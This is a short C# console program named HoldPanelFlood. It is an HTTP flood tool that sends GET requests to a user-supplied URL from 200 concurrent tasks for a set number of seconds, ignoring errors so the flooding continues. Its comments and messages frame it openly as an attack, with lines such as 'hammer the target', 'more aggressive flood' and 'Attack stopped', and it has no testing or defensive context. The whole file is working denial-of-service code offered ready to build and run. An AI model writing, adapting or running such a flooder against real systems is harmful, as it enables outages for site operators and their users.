// HoldPanelFlood.cs
// Compile: dotnet new console -n HoldPanelFlood -f net8.0
// Replace Program.cs with this code, then `dotnet build -c Release`
// Usage: dotnet run -- <target> <duration>

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

class HoldPanelFlood
{
    static async Task Main(string[] args)
    {
        if (args.Length < 2 || !int.TryParse(args[1], out int durationSec))
        {
            Console.WriteLine("Invalid Usage: HoldPanelFlood <URL> <DURATION>");
            return;
        }

        string target = args[0];
        Console.WriteLine($"[🔥] Starting flood on {target} for {durationSec} seconds...");

        using var cts = new CancellationTokenSource();
        cts.CancelAfter(durationSec * 1000);

        // Launch many concurrent tasks to hammer the target
        var tasks = new List<Task>();
        int concurrentTasks = 200; // Adjustable – increase for more aggressive flood

        for (int i = 0; i < concurrentTasks; i++)
        {
            tasks.Add(FloodTask(target, cts.Token));
        }

        await Task.WhenAll(tasks);
        Console.WriteLine("Attack stopped.");
    }

    static async Task FloodTask(string url, CancellationToken ct)
    {
        using var client = new HttpClient();
        // Disable automatic decompression to save memory (optional)
        client.DefaultRequestHeaders.ConnectionClose = false;

        while (!ct.IsCancellationRequested)
        {
            try
            {
                // Use HttpCompletionOption.ResponseHeadersRead to discard body quickly
                using var response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead, ct);
                // Immediately dispose the content stream to free resources
                await response.Content.ReadAsStreamAsync(ct).ContinueWith(t => t.Result?.Dispose());
            }
            catch (OperationCanceledException)
            {
                break;
            }
            catch
            {
                // Ignore errors – keep flooding
            }
        }
    }
}
